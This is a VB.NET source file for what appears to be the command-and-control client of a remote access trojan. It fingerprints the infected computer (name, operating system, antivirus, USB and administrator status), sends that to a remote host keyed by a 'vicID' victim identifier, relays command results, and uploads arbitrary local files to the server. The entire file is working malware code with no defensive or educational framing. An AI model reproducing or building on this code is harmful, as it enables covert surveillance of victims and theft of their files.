﻿Imports System.Net
Imports System.Text

Public Class HTTP
    Public ID As String
    Public Host As String
    Dim Socket As New WebClient
    Public Sub Connect()
        Try
            _GET("connection.php?data=" & ENB(ID & "|BN|" & My.Computer.Name & "|BN|" & My.Computer.Info.OSFullName & "|BN|" & Form1.GetAntiVirus() & "|BN|Online" & "|BN|" & Form1.checkUSB() & "|BN|" & Form1.checkadmin))
        Catch ex As Exception

        End Try

    End Sub

    Public Function ENB(ByRef s As String) As String
        Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
        ENB = Convert.ToBase64String(byt)
    End Function
    Public Function DEB(ByRef s As String) As String
        Dim b As Byte() = Convert.FromBase64String(s)
        DEB = System.Text.Encoding.UTF8.GetString(b)
    End Function
    Public Function _GET(ByVal request As String)
        Try
            Socket.DownloadString(Host & "/" & request)
            Return True
        Catch ex As Exception
            Return ex.Message
        End Try
    End Function
    Public Function _POST(ByVal requst As String)
        Dim s As HttpWebRequest
        Dim enc As UTF8Encoding
        Dim postdata As String
        Dim postdatabytes As Byte()
        s = HttpWebRequest.Create(Host & "/" & "post.php")
        enc = New UTF8Encoding()
        postdata = requst
        postdatabytes = enc.GetBytes(postdata)
        s.Method = "POST"
        s.ContentType = "application/x-www-form-urlencoded"
        s.ContentLength = postdatabytes.Length

        Using stream = s.GetRequestStream()
            stream.Write(postdatabytes, 0, postdatabytes.Length)
        End Using
        Dim result = s.GetResponse()
        Return result
    End Function
    Function Send(ByVal Command As String)
        Try
            Socket.DownloadString(Host & "/" & "receive.php?command=" & ENB(Command) & "&vicID=" & ENB(ID))
            Return True
        Catch ex As Exception
            Return ex.Message
        End Try
    End Function
    Public Sub Upload(ByVal Filepath As String)
        Socket.UploadFile(Host & "/upload.php?id=" & ENB(ID), Filepath)
    End Sub
End Class